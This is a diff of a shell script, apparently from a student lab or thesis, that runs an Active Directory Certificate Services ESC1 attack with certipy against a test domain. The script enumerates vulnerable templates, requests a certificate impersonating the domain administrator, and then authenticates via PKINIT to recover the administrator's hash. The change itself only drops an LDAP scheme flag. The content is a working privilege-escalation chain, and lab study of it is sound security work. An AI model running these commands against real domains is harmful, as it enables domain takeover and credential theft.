@@ -27,19 +27,19 @@ TEMPLATE='ESC1_TCC'
 ALVO='administrator@tcc-adcs.local'
 
 echo '=== [1/4] Enumeracao de templates vulneraveis ==='
-certipy find -u "$USER" -p "$PASS" -dc-ip "$DC_IP" -ldap-scheme ldap -vulnerable -stdout \
+certipy find -u "$USER" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout \
     | tee 01-enumeration.log
 
 echo
 echo "=== [2/4] Solicitacao de certificado em nome de $ALVO ==="
-certipy req -u "$USER" -p "$PASS" -dc-ip "$DC_IP" -ldap-scheme ldap \
+certipy req -u "$USER" -p "$PASS" -dc-ip "$DC_IP" \
             -target "$CA_HOST" -ca "$CA" -template "$TEMPLATE" \
             -upn "$ALVO" -out admin-esc1 \
     | tee 02-req.log
 
 echo
 echo '=== [3/4] Autenticacao PKINIT + UnPAC-the-Hash ==='
-certipy auth -pfx admin-esc1.pfx -dc-ip "$DC_IP" -ldap-scheme ldap \
+certipy auth -pfx admin-esc1.pfx -dc-ip "$DC_IP" \
              -username administrator -domain tcc-adcs.local \
     | tee 03-auth.log
 
